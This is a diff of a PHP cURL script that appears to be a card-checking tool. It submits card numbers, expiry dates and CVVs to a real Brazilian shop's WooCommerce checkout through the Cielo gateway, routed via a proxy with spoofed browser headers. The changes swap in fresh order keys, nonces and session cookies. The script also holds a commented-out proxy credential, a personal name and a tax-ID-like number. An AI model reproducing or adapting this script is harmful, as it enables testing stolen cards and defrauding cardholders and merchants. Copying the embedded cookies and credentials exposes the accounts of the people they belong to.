@@ -24,12 +24,11 @@ $ch = curl_init();
 $proxy = '127.0.0.1:8888';
 //$proxy_auth = 'brd-customer-hl_98932ec4-zone-data_center:y3mtdh39q9w9';
 
-$url = "https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB";
+$url = "https://bymed.com.br/checkout/order-pay/190798/?pay_for_order=true&key=wc_order_ue6gjCxcnjLKE";
 
-$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=3b7f9583726087dda0188c3c06e33c7520230222021053&cielo_webservice%5Btitular%5D=fhghtht+httht&cielo_webservice%5Bfiscal%5D=08601789ervice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDg1LjEwfGRtbHpZUT09fE9EVXVNVEE9fDc2MWZhNDVmMTU5ZDcyZmZlODU0Y2FkZmNjZDRmY2U0&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=ec2d6833e5&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190792%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_kqkE7FmmqdOnB';
+$post = 'cielo_webservice_boleto%5Bbandeira%5D=boleto&payment_method=loja5_woo_cielo_webservice&cielo_webservice%5Bbandeira%5D=visa&cielo_webservice%5Bhash%5D=71eb0b4e74d3b716a9fb5f26a91aff8520230222154146&cielo_webservice%5Btitular%5D=joao+victor&cielo_webservice%5Bfiscal%5D=00928234169&cielo_webservice%5Bnumero%5D='.$cc.'&cielo_webservice%5Bvalidade_mes%5D='.$mm.'&cielo_webservice%5Bvalidade_ano%5D='.$yy.'&cielo_webservice%5Bcvv%5D='.$cvv.'&cielo_webservice%5Bparcela%5D=MXwxfDI5MzMuOTB8ZG1sellRPT18TWprek15NDVNQT09fGVkOWQ4ZmNlYzRjMjQzNTBjNTc2MmQzYjBjNTAxNDgz&woocommerce_pay=1&terms=on&terms-field=1&woocommerce-pay-nonce=b5f785f9b0&_wp_http_referer=%2Fcheckout%2Forder-pay%2F190798%2F%3Fpay_for_order%3Dtrue%26key%3Dwc_order_ue6gjCxcnjLKE';
 
 
-	// VERIFICADOR DE BIN //
 
 $re = array(
     "Mastercard" => "/^5\d{12}(\d{3})?$/",
@@ -84,11 +83,10 @@ $re = array(
 	'Sec-Fetch-Mode: navigate',
 	'Sec-Fetch-User: ?1',
 	'Sec-Fetch-Dest: document',
-	'Referer: https://bymed.com.br/checkout/order-pay/190792/?pay_for_order=true&key=wc_order_kqkE7FmmqdOnB',
+	'Referer: https://bymed.com.br/checkout/order-pay/190798/?pay_for_order=true&key=wc_order_ue6gjCxcnjLKE',
 	'Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-	'Cookie: _ga=GA1.3.1117166428.1677031294; _gid=GA1.3.652228051.1677031294; tk_ai=woo%3AxqmZs2R9JPhZLFiqUO6vynQj; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=vabaw24689%40jobsfeel.com%7C1677204611%7CV0l3wT0WFd8p6Nwly76fBwWA3gY6zb41ZHIdG3qh1Un%7Ca38d4c3166036db3d2e670536100f0cbd1f92a4947109c1070129091eceee9b3; wp_woocommerce_session_ffc900da3a4cd9e55668cca9b7da9628=18988%7C%7C1677204620%7C%7C1677201020%7C%7C0a3158ffc395361cea21914d62bd2209',
-
-
+	'Cookie: _ga=GA1.3.1002344248.1677079980; _gid=GA1.3.536139796.1677079980; tk_ai=woo:9cYD9R4FSELNCQw5iEJ0I0l+; wordpress_logged_in_ffc900da3a4cd9e55668cca9b7da9628=joao01125|1677253274|VO6oTF3jG5DxO2NtcbZriV0MuST1TjLB3RqM121GpgM|c5f229b6433c088477f651968e001154c56e219ed69fca10a2f27082a5d7f83a',
+		
 	)
 ));
 $result = curl_exec($ch);
